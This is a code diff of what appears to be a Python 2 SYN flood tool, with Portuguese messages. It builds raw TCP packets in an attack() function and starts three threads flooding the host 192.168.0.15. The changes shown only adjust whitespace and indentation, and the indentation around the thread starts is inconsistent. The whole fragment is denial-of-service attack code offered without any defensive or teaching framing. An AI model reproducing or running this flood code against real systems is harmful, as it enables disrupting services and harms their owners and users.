@@ -111,6 +111,7 @@ def attack(numero_thread, dest_ip):
         if contador > 49999:
             print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
             contador=0
+            
         psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
         psh = psh + tcp_header;
          
@@ -153,13 +154,14 @@ dest_ip = '192.168.0.15'
 ataque2 = Thread(target=attack,args=[1,dest_ip])
 ataque3 = Thread(target=attack,args=[2,dest_ip])
 ataque4 = Thread(target=attack,args=[3,dest_ip])
+
 while 1:
 	msg = s.recvfrom(12000)
 	if msg:
 		show_begin(dest_ip)
 		ataque2.start()
  		ataque3.start ()
-          	ataque4.start ()
+        ataque4.start ()
 		
 
 
